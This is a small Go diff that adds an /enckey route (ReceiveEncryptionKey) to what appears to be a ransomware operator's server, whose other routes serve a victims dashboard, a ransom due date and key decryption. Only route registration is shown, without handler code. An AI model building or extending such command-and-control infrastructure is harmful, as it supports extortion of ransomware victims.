@@ -48,6 +48,7 @@ func main() {
 	http.HandleFunc("/dashboard", handlers.ServeVictimsDisplay)
 	http.HandleFunc("/due", handlers.GetRansomwareDueDate)
 	http.HandleFunc("/decrypt", handlers.DecryptKey)
+	http.HandleFunc("/enckey", handlers.ReceiveEncryptionKey)
 
 	log.Print("server running on port 8080")
 
